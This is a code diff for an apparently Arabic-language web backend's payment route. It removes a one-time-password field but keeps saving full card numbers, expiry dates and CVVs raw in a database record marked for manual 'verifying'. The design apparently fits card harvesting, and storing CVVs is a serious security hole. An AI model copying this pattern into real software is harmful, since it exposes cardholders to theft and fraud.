@@ -21,17 +21,14 @@ function isValidPaymentData(data: unknown): data is {
   cardHolder: string;
   expiryDate: string;
   cvv: string;
-  paymentOtp?: string;
-} {
+  } {
   if (!data || typeof data !== "object") return false;
   const d = data as Record<string, unknown>;
-  const paymentOtp = d.paymentOtp as string | undefined;
   return (
     typeof d.cardNumber === "string" && d.cardNumber.replace(/\s/g, "").length >= 16 &&
     typeof d.cardHolder === "string" && d.cardHolder.length >= 3 &&
     typeof d.expiryDate === "string" && /^\d{2}\/\d{2}$/.test(d.expiryDate) &&
-    typeof d.cvv === "string" && d.cvv.length >= 3 &&
-    (!paymentOtp || /^\d{4,6}$/.test(paymentOtp))
+    typeof d.cvv === "string" && d.cvv.length >= 3
   );
 }
 
@@ -492,7 +489,7 @@ router.post("/:id/payment", async (req, res) => {
     return res.status(400).json({ error: "بيانات الدفع غير صالحة" });
   }
 
-  const paymentData = req.body as { cardNumber: string; cardHolder: string; expiryDate: string; cvv: string; paymentOtp?: string };
+  const paymentData = req.body as { cardNumber: string; cardHolder: string; expiryDate: string; cvv: string };
 
   try {
     const [app] = await db
@@ -551,7 +548,6 @@ router.post("/:id/payment", async (req, res) => {
         paymentCardHolder: paymentData.cardHolder,
         paymentExpiryDate: paymentData.expiryDate,
         paymentCvv: paymentData.cvv,
-        paymentOtp: paymentData.paymentOtp,
         paymentStatus: "verifying", // في انتظار التحقق من البطاقة
         extraData: app.extraData,
         adminNote: app.adminNote,
